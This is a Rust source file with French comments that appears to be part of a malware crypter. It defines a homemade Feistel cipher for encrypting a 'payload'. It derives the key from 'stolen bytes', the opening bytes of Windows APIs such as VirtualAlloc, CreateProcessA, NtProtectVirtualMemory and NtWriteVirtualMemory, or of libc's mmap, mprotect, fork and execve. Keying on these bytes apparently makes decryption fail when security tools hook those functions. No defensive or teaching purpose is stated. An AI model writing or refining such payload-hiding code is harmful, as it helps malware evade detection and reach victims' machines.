use std::ffi::CString;
use std::ptr;


pub struct RogueCipher {
    round_keys: [[u64; 2]; 12],
}

impl RogueCipher {
    pub fn new(key: &[u8]) -> Self {
        if key.len() < 16 { panic!("Clé trop courte !"); }
        let mut rks = [[0u64; 2]; 12];
        
        let mut k_l = u64::from_le_bytes(key[0..8].try_into().unwrap());
        let mut k_r = u64::from_le_bytes(key[8..16].try_into().unwrap());

        for i in 0..12 {
            k_l = k_l.wrapping_add(k_r).rotate_left(i as u32 + 1) ^ 0x5555555555555555;
            k_r = k_r.wrapping_add(k_l).rotate_right(i as u32 + 1) ^ 0xAAAAAAAAAAAAAAAA;
            rks[i][0] = k_l;
            rks[i][1] = k_r;
        }
        RogueCipher { round_keys: rks }
    }

    fn f(r: u64, k1: u64, k2: u64) -> u64 {
        let x = r ^ k1;
        let rot_val = (k2 & 0x3F) as u32; 
        let y = x.wrapping_add(k2).rotate_left(rot_val);
        y ^ k1
    }

    // CHIFFREMENT (Feistel à l'endroit)
    fn encrypt_block(&self, block: &mut [u8]) {
        let mut l = u64::from_le_bytes(block[0..8].try_into().unwrap());
        let mut r = u64::from_le_bytes(block[8..16].try_into().unwrap());

        for i in 0..12 {
            let k1 = self.round_keys[i][0];
            let k2 = self.round_keys[i][1];
            let temp_l = l;
            l = r;
            r = temp_l ^ Self::f(l, k1, k2);
        }

        block[0..8].copy_from_slice(&l.to_le_bytes());
        block[8..16].copy_from_slice(&r.to_le_bytes());
    }

    pub fn encrypt_payload(&self, data: &mut Vec<u8>) {
        // Padding PKCS#7 like (remplissage avec des zéros) pour avoir un multiple de 16
        let padding_needed = (16 - (data.len() % 16)) % 16;
        for _ in 0..padding_needed {
            data.push(0);
        }

        for chunk in data.chunks_exact_mut(16) {
            self.encrypt_block(chunk);
        }
    }
}

// =============================================================
// EXTRACTION DES STOLEN BYTES (Génération de la clé)
// =============================================================
pub fn get_stolen_key() -> Vec<u8> {
    let mut key = Vec::new();

    #[cfg(target_os = "windows")]
    unsafe {
        let k32_name = CString::new("kernel32.dll").unwrap();
        let ntdll_name = CString::new("ntdll.dll").unwrap();

        let h_kernel32 = GetModuleHandleA(k32_name.as_ptr());
        let h_ntdll = GetModuleHandleA(ntdll_name.as_ptr());

        let apis = [
            (h_kernel32, CString::new("VirtualAlloc").unwrap()),
            (h_kernel32, CString::new("CreateProcessA").unwrap()),
            (h_ntdll, CString::new("NtProtectVirtualMemory").unwrap()),
            (h_ntdll, CString::new("NtWriteVirtualMemory").unwrap()),
        ];

        for (module, func_name) in apis.iter() {
            let addr = GetProcAddress(*module, func_name.as_ptr());
            if !addr.is_null() {
                for offset in 0..4 {
                    let byte = ptr::read_volatile(addr.offset(offset) as *const u8);
                    key.push(byte);
                }
            } else {
                panic!("Impossible de trouver l'API : {:?}", func_name);
            }
        }
    }

    #[cfg(target_os = "linux")]
    unsafe {
        // Sous Linux, libc contient la plupart des appels système de base
        // RTLD_LAZY (1) est souvent suffisant pour l'ouverture
        let libc_name = CString::new("libc.so.6").unwrap();
        let h_libc = libc::dlopen(libc_name.as_ptr(), libc::RTLD_LAZY);

        // Liste des fonctions "intéressantes" pour générer l'entropie
        let funcs = [
            CString::new("mmap").unwrap(),
            CString::new("mprotect").unwrap(),
            CString::new("fork").unwrap(),
            CString::new("execve").unwrap(),
        ];

        if !h_libc.is_null() {
            for func_name in funcs.iter() {
                let addr = libc::dlsym(h_libc, func_name.as_ptr());

                if !addr.is_null() {
                    // On lit les 4 premiers octets (l'entête de la fonction)
                    for offset in 0..4 {
                        let byte = ptr::read_volatile((addr as *const u8).offset(offset));
                        key.push(byte);
                    }
                }
            }
            libc::dlclose(h_libc);
        }
    }

    key
}
